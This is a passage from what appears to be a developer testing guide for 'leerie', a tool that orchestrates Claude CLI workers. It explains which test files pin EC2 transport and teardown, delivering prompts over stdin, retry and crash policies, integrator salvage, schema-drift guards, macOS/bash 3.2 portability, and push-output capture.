`/home/leerie/.gitconfig`; `flyctl` never appearing in the transport log
while `aws`/`ssh` both do; and a stalled transport (the process-group-killing
`_stub_timeout` imported from `tests/test_ec2_transport.py` — the local no-op
passthrough stub would hang for the full sleep) yielding rc 124/137 rather
than hanging, bounded by `LEERIE_SEED_TIMEOUT_S`.

## EC2 instance lifecycle (provision / wait / stop / terminate / teardown)

The EC2 instance lifecycle itself (`scripts/remote/ec2-provision.sh`'s
`provision_instance()`/`wait_for_instance_ready()`/`stop_instance()`/
`terminate_instance()`/`decide_ec2_teardown()`) is covered across two files.
`tests/test_ec2_provision.py` covers the broader surface: instance creation,
the running+ok readiness poll, stop/terminate idempotency on an empty
instance id, and the sidecar writes. `tests/test_ec2_decide_teardown.py` is
the dedicated, deeper pin for `decide_ec2_teardown()`'s
`$LEERIE_REMOTE_EXIT_RC` classification table — the highest-consequence EC2
behavior, mirroring `tests/test_decide_teardown_auto_finalize.py`'s Fly
coverage: each clean-exit rc (0/10/11/75) syncing state via
`_try_fetch_state_for_ec2_teardown` before calling `terminate_instance`; a
sync failure on any clean-exit rc leaving the instance `running` with no
`terminate-instances`/`stop-instances` call ever reaching the `aws` stub's log
(the one-way-ratchet invariant — destroy-then-fetch would make paid-for LLM
work unrecoverable); rc=130/143 taking the detach-banner arm without pausing;
any other non-zero rc stopping (never terminating) the instance and recording
`pause_reason` in the run sidecar; the fetch-before-terminate ordering
independently verified via a hook asserting the instance is still `running`
when `_try_fetch_state_for_ec2_teardown` runs; and `LEERIE_TEARDOWN_DONE`
idempotency surviving a double-fire (INT then EXIT) in both directions even
when `LEERIE_REMOTE_EXIT_RC` is clobbered between the two calls.

## EC2 fetch-branch streamback

The EC2 stream-back counterpart to `fetch-branch.sh` —
`scripts/remote/ec2-fetch-branch.sh`'s `fetch_state_ec2()` — is tested in
`tests/test_ec2_fetch_branch.py`, modeled on `tests/test_fetch_branch_sh.py` +
`tests/test_fetch_branch_leerie_streamback.py` and using
`tests/test_ec2_seed_repo.py`'s stubbed-`aws`/stubbed-`ssh` transport harness
(`ssh` streams the private download helper `_ec2_fetch_ssh`'s raw
remote-command stdout straight back, since `ec2_tar_pipe` itself is
upload-only): a branch committed on the instance round-trips to the host as a
fetchable bundle whose tip matches the instance-side tip; the run-state tar
extracts under `LEERIE_STATE_HOST_DIR` (or `USER_REPO/.leerie` by default)
and `run.json` (its `no_push` included) arrives unchanged, as from
`fetch-branch.sh`; neither the instance's `.leerie/config.toml` nor
its `.leerie/Dockerfile` is streamed back, and a recorded capture is named,
not applied; and both `aws` and `ssh` appear in the transport log while `flyctl`
never does.

## EC2 launch/attach transport

The launch/attach counterpart to `flyctl ssh console` — `scripts/remote/
ec2-ssm.sh`'s `ec2_launch_detached()`/`ec2_attach()` — goes over SSH and is
tested in `tests/test_ec2_ssm.py` against an `ssh` stub that runs the remote
command locally with the caller's stdin attached, as sshd does. That models
the property the transport exists for; the earlier SSM-session stub modeled
a stdin pass-through that a real `AWS-StartInteractiveCommand` session does
not have (on a real instance its pty turned `python3 -` into an interactive
prompt and the session ended at host-stdin EOF), which is how the SSM design
passed every test while being unable to launch. Pinned: launch runs
`sudo -n python3 -` over SSH and prints the payload's output; rc=75 (the
flock-loser smart-resume pivot) comes back natively; a multi-KB payload
arrives intact (the computed result proves every line was read); attach
streams `sudo -n sh -s` output and returns its rc; attach is *not* wrapped
in the seed timeout (a tail is long-lived); both fail closed on an empty
`LEERIE_EC2_INSTANCE_ID` with no ssh call; `--shell` on a live run is an
SSM `AWS-StartInteractiveCommand` session running
`cd /work && exec sudo -n bash -i` with region/profile, and no ssh; the
live-run tail goes over ssh; double-sourcing is idempotent. Also listed in
`tests/test_ec2_bash32_portability.py`'s `_EC2_SCRIPTS` for bash 3.2
sourcing coverage.

`ec2_remote_exec` (ec2-lib.sh) is pinned in `tests/test_ec2_transport.py`
the same way: exact stdout, the remote rc (42), a program on stdin with
quoted/spaced argv reaching `python3 -` intact and returning 75, target
resolution through `describe-instances` when `LEERIE_EC2_SSH_TARGET` names
another instance, a fail-closed error when the instance has no public IP,
no SSM call, `sudo -n bash -c <cmd>` as the elevated form, failure when
sudo is refused, and the seed timeout. The shared fixtures
(`tests/ec2_stub.py`'s `make_ssm_stub_ssh` + `make_remote_exec_stub`) route
`sudo -n bash -c <cmd>` through an `ec2-remote-exec` helper that applies
the instance-path rewrites, so the seed/fetch/kill/accept-blocked tests
drive the same SSH form.

## EC2 launcher dispatch branch (`RUNTIME=ec2`)

The launcher's `RUNTIME=ec2` dispatch branch itself — the seam none of the
above can see, since they test `ec2-lib.sh`/`ec2-provision.sh` standalone
rather than the `leerie` launcher's own dispatch — is covered in
`tests/test_ec2_e2e_provision.py`: the branch is extracted verbatim from the
launcher and run against `tests/ec2_stub.py`'s
resource-tracking `aws` stub. It pins that `require_aws`'s
`sts get-caller-identity` call precedes any `ec2 run-instances` call by call
index (mirroring `tests/test_provision_volume.py`'s ordering discipline), and
that a failing credential probe aborts the launch non-zero, emits the
`aws sso login --profile <p>` hint, and leaves zero tracked instances and
volumes in the stub's state — both with provisioning wired in after the
dispatch block and with the dispatch block alone, so the gate is pinned as
the branch's own contract independent of what runs after it. The module also
defines the shared bash harness (stub-on-PATH + launcher invocation helpers)
that sibling EC2-dispatch test modules import. A dedicated
`test_successful_provision_leaves_exactly_one_instance_and_no_orphaned_volume`
pins the provision-success resource count against the stub's *tracked state*
rather than argv/log line counts: exactly one instance (not zero — a no-op
regression; not two — a double-provision regression, both falsified live
against hand-broken harness variants) and zero tracked volumes, since
`provision_instance()` never calls `create-volume` — root EBS is implicit via
`run-instances` with AWS's own `DeleteOnTermination=true` default (DESIGN §6
"EBS volume lifecycle" case 1) — so any tracked volume on this path would by
construction be an orphan.

## Worker prompt transport (stdin, not argv)

The worker-prompt-over-stdin transport (docs/IMPLEMENTATION.md §3 "User
prompt transport — stdin, not argv" — a single argv element cannot exceed
Linux's `MAX_ARG_STRLEN`, 131,071 bytes, and reconciler/plan_overlap_judge
payloads routinely exceed that on their own, crashing with a raw execve
`OSError: [Errno 7] Argument list too long`) is pinned in
`tests/test_prompt_over_stdin.py`: `build()` emits no positional argument
after `-p` at any payload size, so no argv element it constructs can carry
the prompt (true by construction, not merely measured for one size); a
positional prompt would silently win over stdin with no error, so
`test_no_positional_prompt_after_dash_p` pins the element immediately after
`-p` is always a flag; the retry path (`build(retry_note)`) routes the
concatenated retry text through `stdin_data` too, not argv; `_invoke` passes
`stdin=PIPE` when `stdin_data` is given and `stdin=DEVNULL` otherwise
(direct-cmd callers with no prompt to feed, e.g. the preflight smoke test,
are unaffected); and `test_real_subprocess_150kb_stdin_no_deadlock` spawns a
real `python3` child and feeds it a real 150,063-byte payload over a real OS
pipe via `_invoke`'s concurrent `_feed_stdin` task, proving no deadlock
between the feeder and `_read_stream`/`_drain_stderr` for a payload well over
both a single pipe buffer and the single-argv ceiling this fix routes around.
`tests/test_replay_capture.py` and `tests/test_no_result_event_retry.py` were
updated in the same change to assert against `stdin_data` instead of an argv
element, since both stub `_invoke` to inspect what `claude_p` constructs.

### The stdin-feeder ordering deadline

Routing the prompt over stdin created a **deadline** the argv form never
had, guarded by `tests/test_stdin_feeder_ordering.py`. `claude -p` waits a
hard-coded 3 s for its first stdin byte, then drops its `data` listener, so
a late write is DISCARDED and the worker exits 1 on `Input must be
provided`. leerie made two SYNCHRONOUS broker round-trips between spawn and
first write, each bounded by `_cgroup_request`'s 5 s timeout — a stall
larger than the deadline in front of it. Measured: **218 workers lost,
12.4% of all invocations in the affected runs**, retried up to 4x each
against `max_total_workers`, spanning v0.9.95–v0.16.0. The first fix
(#198: a `create_task` feeder at the spawn plus `to_thread` on both broker
calls) narrowed the window but still depended on the event loop scheduling
the feeder within 3 s, and lost every prompt under bursts of synchronous
work on the loop; #200 replaced the feeder by staging the prompt to a file
that is the child's stdin before it exists (the `to_thread` broker calls
stayed). `test_only_a_staged_file_survives_a_blocked_event_loop` drives
both transports against a blocked loop behaviourally (pipe: lost; file:
delivered) rather than trusting source order, and the remaining tests pin
the staging order, that no writer task exists, that stdin is never a pipe
when a prompt is given, that the broker calls stay off the loop
(`test_cgroup_calls_do_not_block_the_event_loop`), that `gather` awaits no
stdin task, and the staged file's cleanup. One harness
trap: `_invoke_src` strips comments via `tokenize`, not a `#` heuristic (a
`#` inside a string literal would corrupt the result), because the region's
comments name the old feeder, `await` and `_cgroup_enroll` while explaining
the history, and `test_no_writer_task_exists` asserts a name is absent.

## Appended system prompt transport

The appended system prompt (docs/IMPLEMENTATION.md §3 "Appended system
prompt transport — file, with a probe + inline fallback" — the second large
argv element that compounds with the user prompt toward the same
`MAX_ARG_STRLEN` ceiling, worst-case on the overlap judge) is pinned in
`tests/test_append_system_prompt_file.py`:
`_append_system_prompt_file_supported()`'s supported/unsupported
classification (by stderr text — `"unknown option"` means unsupported, since
both outcomes exit non-zero and only the message distinguishes them),
fail-closed behavior on a missing `claude` binary or a probe timeout,
once-per-process memoization (a second call makes no further `claude`
invocation), and its own throwaway probe file being cleaned up; `build()`'s
branch on the probe result (`--append-system-prompt-file <path>` with the
temp file holding `system_prompt` verbatim when supported, the inline
`--append-system-prompt` when not); the temp file being removed once
`claude_p()` returns, on both the success path and an exception path (a
`TerminalAuthFailure` raised from inside the try/finally-wrapped retry loop —
the schema-key drift guard itself runs before the temp file is created, so it
needs no cleanup); and the retry loop reusing the same temp file across both
attempts rather than recreating it, since `system_prompt` is fixed for the
whole `claude_p()` call. `tests/test_replay_capture.py`'s two
system-prompt-plumbing tests (`test_args_match_capture_fields`,
`test_override_system_prompt`) pin the probe to unsupported via monkeypatch
so their argv assertions don't depend on whether the live `claude` CLI on the
test host happens to support the undocumented file flag.

## No-result-event retry

The no-result-event retry (DESIGN §6, `claude -p` exits 0 having streamed a
full session but never emits its terminal `result` event — upstream
anthropics/claude-code #8126/#1920/#74761, unresolved) is pinned in
`tests/test_no_result_event_retry.py`: `_invoke` returns a synthetic
`_leerie_synthetic: "no_result_event"` envelope rather than raising, so
`claude_p`'s 2-attempt loop absorbs it (a raised WorkerError propagated
past that loop and die()d the run non-resumably). The load-bearing test,
`test_synthetic_envelope_is_not_an_auth_or_quota_failure`, extracts the
**real** message from `_invoke`'s source via `ast` rather than a copied
fixture — `_is_auth_or_quota_failure` falls back to text markers on
`result`, so a hand-copied fixture passes while the shipping message
diverts every no-result retry into the tenacity backoff and burns the
whole `auth_retry_max_sec` budget (verified: the copied-fixture version
does **not** fail when the landmine is introduced; the ast-extracted one
does). Controlling leerie's own message is **not sufficient** — the
envelope interpolates the worker's **raw stderr** into `result`, so a
worker whose stderr merely mentions auth/rate-limiting trips the same
markers. Fix: an exemption in `_is_auth_or_quota_failure` for
`_leerie_synthetic` envelopes (the numeric `api_error_status` check still
runs first). `test_worker_stderr_cannot_trip_the_auth_classifier` pins it
against three realistic stderr payloads, and
`test_real_envelopes_still_match_the_text_markers` guards against
over-reaching. A source-coupling guard pins the synthetic return as the
**last** arm of the no-envelope block, since the nonzero-rc arm above it
covers leerie's own deliberate SIGTERM/SIGKILLs, which must never be
retried. `tests/test_warnings_before_die.py` pins that all four judgment
phases (classifier, provision, reconciler, plan_overlap_judge) log their
`_run_checked_loop` warnings **before** `die()`, since `die()` calls
`sys.exit()` and any loop after it is unreachable (falsified live:
reverting one site fails the guard).

### `_run_checked_loop` crash policy

`_run_checked_loop`'s crash policy is pinned in `tests/test_checked_loop.py`:
a `WorkerError` (infrastructure — PID exhaustion, OOM, a killed session) is
**retried** against the same `judgment_check_rounds` budget, because the
re-invocation is a fresh `claude -p` session with a clean PID table — true
for implementers but false for every `_run_checked_loop` caller until the
retry existed. A worker KILLED at its wall-clock ceiling is the same class
and is retried too — `_invoke` raises `subprocess.TimeoutExpired`, not a
`WorkerError` — though bounded to `_TIMEOUT_RETRY_MAX` attempts rather than
the full round budget, since a timeout has already spent its whole ceiling
before it is observed. Any *other* exception is a leerie bug rather than a
flaky worker, so it still abandons the loop immediately (`test_loop_crash_breaks`,
which uses `RuntimeError` precisely to pin that split). Also pinned:
all-rounds-crash still returns `None` so callers' `is None` escalation is
unchanged, the retry is bounded at exactly `max_rounds`, and a crash must
clear `last_res` so a stale earlier result is never returned as the crashed
round's output.

## Unjudged integrator merge on resume

DESIGN §6 *A committed resolution is not a judged one*:
`tests/test_resume_unjudged_integration.py` drives the real `phase_execute`,
`integrate_wave`, `setup-run.sh` / `new-worktree.sh` / `integrate.sh` and the
real integration gate on a wave whose second subtask conflicts, with an
integrator that commits a resolution dropping one side under its own message.
The process is killed inside the integrator before and after its commit, and
after each save until the verdict is recorded and the `integration_unjudged`
marker cleared; every resume must judge the merge, repair the drop, give the
merge its `leerie: integrate <sid>` subject, leave the clean sibling unjudged
and advance the wave. Before the fix the kill after the commit and the kill
after the first save in the window both resumed onto an unjudged merge
("all 2 subtask(s) already settled, skipping"); removing the marker, the
`integrate_wave` resume branch or the `phase_execute` shortcut exclusion each
fails the suite again.

## Wiring-gate repair on resume

DESIGN §5 *A wiring re-check on the fully-merged plan*:
`tests/test_wiring_gate_repair_resume.py` drives the real `_run_phases` and
`phase_wiring_gate` (judge scripted to a repairable `missing_requires`) and
kills after each save from the verdict's first appearance until the repaired
`plan_snapshot` is on disk, plus once inside the re-schedule. Disk holds both
or neither, and every resume reaches `phase_execute` with the repaired wave
order. With the gate saving its own verdict the window is two saves, and the
first resumed past the gate onto the unrepaired snapshot.

## Integrator-crash salvage path

The integrator-crash salvage path (DESIGN §7 *salvage if there is something
to salvage*) is tested in `tests/test_rescue_integrator_work.py` against real
temp git repos left mid-merge. `_rescue_integrator_work` captures a crashed
integrator's in-progress resolution to `refs/leerie/rescue/<run-id>/<sid>/<n>`
(a new ref per rescue, never overwritten: `tests/test_rescue_ref_unique.py`)
before `git merge --abort` destroys it (verified: abort reverts a resolved
file to its pre-merge content, leaving no stash and no reachable object). The
load-bearing pin is `test_rescue_does_not_require_a_merge_commit`: the rescue
must **not** be gated on `check_merge_committed`, because a crashed
integrator typically dies mid-resolution having committed nothing —
`integrator-feat-006` never ran `git commit` while `integrator-feat-005`
did — so a commit-gated rescue declines exactly the case worth saving.
Introducing that gate fails 4 tests. The mechanism: a throwaway
`GIT_INDEX_FILE` seeded from HEAD, because both `git stash push` **and**
`git stash create` refuse a conflicted tree ("Cannot save the current index
state") — an unmerged index is precisely what an integrator crash leaves
behind. Also pinned: untracked files are captured, the real index/worktree
and `MERGE_HEAD` are untouched, the temp index is cleaned up, refs are
namespaced per run+subtask so two crashes cannot clobber each other, and a
tree identical to `HEAD^{tree}` returns `None` rather than a ref naming an
empty diff.

## Remote schema duplication (`collect-subtrees.sh`)

**`scripts/remote/collect-subtrees.sh` embeds a second copy of
`SCHEMAS["integrator"]`** as a single-quoted shell string, because it invokes
`claude -p --json-schema` directly from bash on the remote machine. Its
payload does load the orchestrator module baked into the image, but only
through `scripts/worker-guard.py` for the worker guard (deny rules, notices,
hook, env); the schema is not taken from it, and the duplicated base deny
list is used only when that load fails. **Any edit to that schema must
update both.**
That same direct invocation also puts the script outside the
`--dangerously-force-strict-output` path — it runs only after the
orchestrator (which owns the proxy) has exited, so output there is
schema-validated but not constrained during generation.
`tests/test_collect_subtrees_integrator_schema.py` is the guard: it parses
the `integrator_schema='{...}'` assignment out of the real script and
asserts whole-object equality with the live `SCHEMAS["integrator"]` —
deliberately whole-object rather than a spot-check of the fields that last
drifted, since the next drift will be somewhere else. It exists because the
copy **had already silently drifted in production** (measured 2026-08-03):
it still carried `maxLength` 2000/500 on the confidence fields, values the
live schema had moved off twice since (to 8000/2000, then deleted outright),
so remote integrator runs were validating worker output against a
materially different contract than local ones — invisibly, because nothing
compared the two. A corpus fixture had even named this test file before it
existed; the guard was planned and never landed, which is precisely how the
drift went unnoticed.

## `resume` auto-pick of the newest resumable run

`tests/test_resolve_run_id_autopick.py` covers bare `resume` auto-picking
the newest resumable run (`in-progress`/`paused`/`incomplete`), including
two traps found by running the design against a real 58-run state dir:
`seed-failed` rows carry no `started_at` and sorted to the *top* of a naive
newest-first sort (they are now list-only, never auto-picked), and a
missing `started_at` must never outrank a real timestamp. An explicit run-id
stays exempt from the filter (so `resume <seed-failed-id>` still works) and
an unknown one still fails closed. The `seed-failed` exclusion is a
deliberate behavior change with a UX cost, pinned by
`test_resolve_run_id.py::test_resolve_lone_orphan_is_not_auto_resumed`: bare
`resume` used to auto-pick a *lone* orphan, and now dies instead — a
seed-failed run aborted before `phase_classify` and needs an operator
decision (re-seed vs. kill), since resuming blind can re-trigger the same
seed failure. The die is therefore required to stay actionable (names the
run, its `status=seed-failed`, and the explicit-id escape hatch), because
that escape hatch is the documented recovery path for the 2026-06-04 hangs.
`--report`/`--phase` still auto-pick a lone orphan — they are read-only.
`tests/test_container_entry_run_id.py` covers `container-entry.sh` skipping
its cidfile `--run-id` injection when `resume` is present — a resume
container is a *new* container whose id matches no run on disk, which is
what made bare `resume` die naming an id the user never typed. The
injection block is extracted from the real script at test time (the
`_extract_config_arm` pattern) so it cannot drift.

## The macOS developer surface

CI is `ubuntu-latest`, so it **structurally cannot** catch a macOS-only
break. Three defect shapes have reached `main` this way; each cost a
developer's whole failure list, which is worse than it sounds -- a list
dominated by environment noise trains people to ignore it.

- **A binary macOS does not ship.** `leerie_repo_lock` took the lock with
  `flock(1)` (#296), which macOS has none of: it exited 127 and took every
  `setup-run.sh` with it, so 9 of `tests/test_collect_subtrees_sh.py` failed
  there while CI stayed green. The lock is now `fcntl.flock` on the
  descriptor the shell itself opened, which is what `flock(1)` locks too --
  measured on both kernels: 6 holders x 200 read-modify-write iterations lose
  no update, and a SIGKILLed holder releases identically (the lock survives
  in an inherited child either way, binary or not). Pinned by
  `tests/test_repo_lock_is_portable.py`, whose last case drives the real
  function on a PATH with no `flock` at all. The repo knew the fact already
  (`scripts/remote/lib.sh`'s "mkdir-as-mutex (portable; macOS has no `flock`
  binary)") in a different file, which is the shape to watch for.
- **A path that is a symlink there.** `/tmp` is `private/tmp` on macOS, so
  `_worker_own_dirs` compared an unresolved `_worker_tmp` against
  `os.path.realpath(p)` and never matched: a worker's own temp directory was
  granted nothing. Latent in the image, where `/tmp` is a directory and the
  two spellings are one. A real grant bug, found only because the test ran on
  a Mac (`tests/test_confined_cli_env.py`'s socket case).
- **A `/proc` that is not there.** Both `tests/conftest.py`'s
  `processes_marked` (autouse, so it errored the teardown of every test) and
  `tests/test_commands_keep_default_signals.py`'s probe read `/proc`. Gated
  now; see the `needs_landlock` entry above and
  `_no_process_outlives_its_test`.

`scripts/worktree-lib.sh` and its sourcers are part of this surface: the
collect-subtrees tests drive them under the host's own bash.

### Measuring this surface

Two ways to get a wrong answer about it, both met while gating it (#308,
#310). They are recorded because the counts look authoritative either way.

- **A count means nothing unless the host is idle and the files run one
  selection at a time.** CLAUDE.md's "never run two copies of the suite
  concurrently" gives the magnitude (two overlapping suites measured 78 and
  57 flaky failures); this surface is where it bites hardest, because these
  tests fork real processes and spawn real confined commands. Measured here: a
  widened selection read **98 failed** with a baseline suite still running in
  the background, and a 97-vs-122 before/after comparison was contaminated the
  same way -- both unusable. Re-run one selection at a time on an idle host
  and the files that had looked changed read *identically* on either side
  (`tests/test_build_repo_image.py`: 24 failed, 4 passed before and after;
  `tests/test_blt_memo.py` + `tests/test_capture_deps.py`: 100 passed both).
  Watch the wall-clock as a tell: the same file took 384 s idle and 778 s
  with another suite alongside, and the slow run reported a different count.
  The cheapest check that a count is junk is `pgrep -f pytest` before
  believing it.
- **A `failure` conclusion on the `test` workflow does not imply a failing
  test.** On the 0.44.10 release commit every Python leg reported
  `14111 passed, 161 skipped, 0 failed` with no `FAILED` name anywhere in the
  log, and the step still exited 1 -- on a shutdown-time
  `PytestUnraisableExceptionWarning` (`Exception ignored in
  BaseSubprocessTransport.__del__` -> `RuntimeError: Event loop is closed`),
  raised after the summary was printed. The same exit appears on unrelated
  heads, so it says nothing about any one change. Read CI's summary line
  first, then grep the log for `FAILED`; none means the tests passed, and a
  local count that disagrees is measuring the host, not the code.

Both rules point the same way: compare *sets* of failing test IDs, not totals,
and prefer CI's own summary over re-deriving it locally.

Two further files pin contracts this surface exposed:

- `tests/test_shim_refuses_on_a_libc_without_prctl.py` --
  `install_seccomp`'s docstring has always promised "Raises OSError naming
  the step", but the `prctl` lookup is a `ctypes` attribute access, so on a
  libc without the symbol it raised `AttributeError`, which
  `_confine_or_126`'s `except OSError` does not catch: the shim tracebacked
  and exited 1 instead of writing its refusal and exiting 126, and a caller
  read "no verdict from this run" where the shim meant "I will not run
  this". That silence hid the cause of five failing tests for a whole
  debugging session. The contract is now driven by injection, so it is
  checked on every kernel, including the Linux one where `prctl` exists.
- `tests/test_landlock_gate_wiring.py` -- the gate's own wiring; see the
  `needs_landlock` entry above.

## Bash 3.2 portability (EC2 shell surface)

**The EC2 shell surface must run on bash 3.2** — macOS's `/bin/bash`, and
the shell the EC2 tests actually get (they pin `PATH` to
`{stub_dir}:/usr/bin:/bin` to isolate their stubbed `aws`, which excludes
Homebrew's bash 5). CI is `ubuntu-latest`, so it **structurally cannot**
catch a bash-4-only construct; two of them lived in `ec2-lib.sh` /
`ec2-provision.sh` and showed up only as 33 failing tests on a developer's
Mac. `tests/test_ec2_bash32_portability.py` is the guard: it sources each
EC2 script under a real `/bin/bash` with `set -u` and no
`LEERIE_AWS_*`/`AWS_*` (the default config, which leaves every optional-arg
array empty), **and calls the functions that expand those arrays** —
sourcing alone is not enough, since an unguarded `"${arr[@]}"` sits inside a
function body the shell never evaluates until called (verified: the
source-only version of this test passes with the bug reintroduced). It skips
cleanly on hosts whose `/bin/bash` is ≥ 4.3, so it is a macOS-developer
guard, never a CI flake. Paired with a source-level `local -n` / `declare -n`
ban (namerefs are bash 4.3+; echo the tokens instead — see
`_aws_region_profile_args`). The guard was extended (test-006) to cover every
EC2 launcher arm wired by test-001..test-005: `_EC2_SCRIPTS` gained
`ec2-resume-instance.sh`, `ec2-seed-auth.sh`, and `ec2-fetch-branch.sh` (all
sourced by the launcher's EC2 arms but previously untested here);
`_EXPANSION_CALLSITES` gained `resume_instance`; and a new
`test_ec2_launcher_verb_runs_cleanly_under_bash32` runs the real `leerie`
binary itself (not just `scripts/remote/ec2-*.sh`) under bash 3.2 for
`stop`/`kill`/`accept-blocked` with `LEERIE_AWS_PROFILE`/`LEERIE_AWS_REGION`
unset, since each of those arms builds its own optional-arg array from those
two vars directly in `leerie` before calling `resolve_aws_credentials`. This
surfaced a real, previously unguarded instance of the class: all four call
sites (`accept-blocked`, `stop`, `kill`, and the main `RUNTIME=ec2` dispatch)
expanded their creds-args array as a bare `"${arr[@]}"` instead of
`${arr[@]+"${arr[@]}"}` — fixed in the same change. The nameref ban was
likewise extended to `leerie` itself (`test_no_namerefs_in_launcher`). A
later child added `pytest.param(["accept-integration", ...])`, covering
`accept-integration`'s own `_ai_aws_creds_args` array expansion the same way.

## Host-only tests gated on `jq`

**Host-only tests are gated on `jq`** (`HAS_JQ` in `tests/conftest.py`,
mirroring `HAS_TREESITTER`). Five modules — `test_host_finalize_sh.py`,
`test_decide_teardown_auto_finalize.py`, `test_launcher_finalize_no_work.py`,
`test_launcher_no_push_skips.py`, `test_push_output_capture.py` — source
bash the **host** owns (`scripts/host-finalize.sh`, `provision.sh`'s
`decide_teardown`, the launcher's `finalize`/`no_push` paths) and parse
`run.json` with real `jq`. The harnesses stub `git`/`gh` but not `jq`, so
it's silently inherited from whichever machine runs pytest — passing on a
dev host and CI (both ship jq), failing only inside the leerie image,
which deliberately omits it: host bash uses `jq` (launcher hard-fails at
preflight without it), code *inside* the container uses python3 (per
`scripts/remote/seed-auth.sh`). `gh` **is** in the image for the mirror
reason. **Do not "fix" a skip by adding `jq` to the Dockerfile** — per
DESIGN §6 *Finalization* those scripts can never succeed in-container
anyway (gh auth, ssh-agent, Keychain are host-side); installing jq buys a
green tick, not working code. A `grep jq` does **not** reproduce the gated
list — two of the five never mention jq and fail only because the script
under test shells out to it. A module-level `skipif` does **not**
propagate through an import, so `test_push_output_capture.py` reusing
`test_host_finalize_sh.py`'s runner needs its own.
`tests/test_jq_gate_wiring.py` guards that each of the five both imports
`HAS_JQ` and carries a `skipif` referencing it.

## Push output capture (stdout+stderr split)

**The push's two streams are captured separately, and the obvious fix is the
trap.** `host_finalize` captured the push with `2>&1 >/dev/null` — stderr
only — while git forwards a pre-push hook's stdout to git's own stdout, where
`tsc` and `biome` write their diagnostics (jest and vitest use stderr, which
is why this went unnoticed). Measured: a `push_error` of two pnpm deprecation
warnings for a push whose real cause was 13 lines of `TS2307`, undiagnosable
from leerie's own output, three misdiagnoses, at the end of a $57 run. But
plain `2>&1` is **wrong**, because the captured blob is also the input to
`_host_finalize_is_auth_or_network_push_error`, whose arm matches a
qualified phrase on a `^fatal:`/`^remote:` line — and a hook that refreshes
submodules or runs `git ls-remote` prints exactly that shape on stdout,
flipping a hook failure to "auth/network" and suppressing the `--no-verify`
hint. Measured against the real classifier: **3 of 3** adversarial hook
shapes flip, while real `tsc`/`vitest` output does not. So stderr classifies
and stdout+stderr is displayed, leaving the committed 23-case corpus score
unchanged **by construction** rather than by re-measurement.
`tests/test_push_output_capture.py` pins both halves; its parametrized
`test_git_framed_hook_stdout_does_not_suppress_the_hook_hint` is the
load-bearing one, paired with an anti-vacuity control that a genuine
credential failure on stderr still classifies as auth (else the guard could
pass by disabling the classifier). Falsified live: routing `push_all` into
the classifier fails 4 tests, and the control keeps passing.

### Three further traps in the same change

Three further traps, each caught by a test rather than by review. (1)
`push_error` reaches `run.json` as a single `jq --arg` value, bounded by
`MAX_ARG_STRLEN` (131,072 bytes) — one real recorded `push_error` is
already **104,520 bytes on stderr alone**, so folding hook stdout in is
what makes the ceiling reachable; past it `jq` cannot be exec'd and
`set -e` aborts `host_finalize` before the diagnostic prints. The
persisted copy is tail-bounded at 32 KiB (printed copy: 4000 bytes);
`test_oversized_push_output_still_writes_the_sidecar` drives ~200 KB
through it. (2) Husky v9 prints its banner on **stdout** (line 20 of
`.husky/_/h` is a bare `echo` with no `>&2`), so the "which hook" naming
grep, reading stderr only, could never match the commonest hook runner in
existence; it now reads stderr plus the hook's stdout. (3) That grep must
NOT read `push_all`, because leerie's own section marker
(`--- pre-push hook output (stdout) ---`) contains "pre-push"/"hook" and
matches *first* — measured, the hint misattributed husky's own banner. A
separate `push_hook_out` variable holds the raw stdout so the grep never
sees leerie's own prose. The test asserts the name is "script", not merely
that "pre-push" appears — a laxer assertion passes against the bug.

## Locale-stripped harness masks a byte-vs-character bug

**A harness that strips the locale makes a byte-vs-character bug
undetectable — the sharpest vacuity trap in the file.** Both push bounds
are `tail -c` (cuts BYTES), while `${#var}` counts CHARACTERS only under a
multibyte locale. `test_host_finalize_sh.py`'s runner builds a minimal env
(no `LANG`/`LC_ALL`), so bash runs in the **C locale, where `${#var}`
counts bytes** and byte-based vs char-based implementations are
*indistinguishable*. The first version of
`test_persist_bound_is_measured_in_bytes_not_characters` passed against the
exact bug it targeted — falsified: 35 passed with the fix reverted. It now
resolves a working multibyte locale first (`_multibyte_locale()` probes
bash's own `${#}`, requiring 2 not 6 for a two-character Japanese string),
passes it through `extra_env`, and **skips loudly** when none exists.
Generalise: for locale-/encoding-/timezone-sensitive behaviour, the
harness's minimal env is a *variable of the experiment*, not scaffolding.

Two further harness traps: the degrade test's `mktemp` stub must fail only
the plain-file form, since stubbing every form aborts at the rebase step's
`mktemp -d` earlier, passing on a path that never reached the push. And the
shared runner decodes with `errors="replace"`, since a byte-anchored
truncation can land mid-character and strict decoding raises
`UnicodeDecodeError` before any assertion runs. (`jq` substitutes U+FFFD
and still writes valid JSON at rc 0, so the byte cut is safe for
`run.json`.)

## Per-subtask delta proxy: the `{test_files}` tier

The per-subtask delta proxy's `{test_files}` tier is covered by
`tests/test_test_files_proxy.py` (51), `tests/test_scoped_proxy_corpus.py`
(5) and `tests/test_scoped_degrade_warning.py` (13). Three lessons
generalise. **(1) A non-test path is an ERROR to pytest, not a no-op** —
`pytest orchestrator/leerie.py` exits 5, `pytest docs/DESIGN.md` exits 4,
and `pytest docs/DESIGN.md tests/test_blt_semaphore.py` ALSO exits 4. A real
subtask diff mixes docs/source with tests, so a `{files}` template on a
runner with no source→test impact analysis reports RED on nearly every
subtask; fix: filter the substitution (`{test_files}`), with the
pre-existing empty-list rule rendering nothing when no test file is present
(the axis is then deferred — see the next section). **(2) Scan the author's
input, not the rendered output.** The unknown-placeholder guard first
scanned the SUBSTITUTED command, so a changed-file path containing braces
(e.g. `src/{locale}/page.test.ts`) was misread as an unknown placeholder,
disabling the proxy and misdiagnosing it as install skew. Scanning the
template with `_SCOPED_PLACEHOLDERS` stripped removes the hazard by
construction. **(3) A planner prediction is not a diff.** The ratio was
first taken from `files_likely_touched` and was badly wrong — 40%
test-touching predicted (109 of 270) vs. 94% real (34 of 36) — since
CLAUDE.md mandates tests regardless of planner prediction. The frozen corpus
is 36 REAL per-subtask diffs from leerie's own run branches, each row an
integration merge's **first-parent** diff (a plain two-dot diff against the
run base folds in siblings — the first recovery attempt reported 0%
source-only this way, and so shipped a fixture that could not exercise the
no-test-file path at all).

## The whole suite is orchestrator-owned

`tests/test_full_suite_ownership.py` (155) covers DESIGN §9's two
whole-suite mechanisms: *absence means deferred, never full* for the test
axis (`_select_subtask_axes`, `_DEFERRED_AXIS`) and the single rule list
behind the deny, the plan-time strip, the settle-time exemption and the
notice (`_full_suite_rule_patterns`, `_shell_subcommands`,
`_denied_by_full_suite_rules`, `_strip_canonical_suite_commands`,
`FULL_SUITE_NOTICE`). Inputs are the 2026-10-26 incident's real
`runs_commands`, commands whose deny verdict was observed live on the CLI
